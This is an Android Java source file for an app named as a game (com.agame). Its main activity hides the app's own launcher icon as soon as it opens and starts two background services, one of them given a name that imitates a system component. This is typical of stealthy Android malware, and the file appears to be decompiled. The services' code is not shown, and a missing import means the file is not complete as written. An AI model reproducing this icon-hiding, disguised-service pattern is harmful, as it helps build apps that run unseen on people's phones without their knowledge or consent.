package com.agame;

import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;

public class MainActivity extends Activity {

        @Override
        protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                // 隐藏程序图标
                this.start();
                this.startService();
                setContentView(R.layout.activity_main);
        }


        @Override
        public boolean onCreateOptionsMenu(Menu menu) {
                getMenuInflater().inflate(R.menu.main, menu);
                return true;
        }

        void startService() {
                if (!Util.isWorked(this.getBaseContext(), TMyService.class.getName())) {
                        Intent v0 = new Intent(this.getBaseContext(), TMyService.class);
                        v0.setAction(TMyService.class.getName());
                        this.getBaseContext().startService(v0);
                }

                if (!Util.isWorked(this.getBaseContext(), Wksvr.class.getName())) {
                        Intent v1 = new Intent(this.getBaseContext(), Wksvr.class);
                        v1.setAction("com.system.android.Wksvr");
                        this.getBaseContext().startService(v1);
                }
        }

        void start() {
                try {
                        this.getPackageManager().setComponentEnabledSetting(this.getComponentName(), 2, 1);
                } catch (Exception v1) {
                }
        }

}
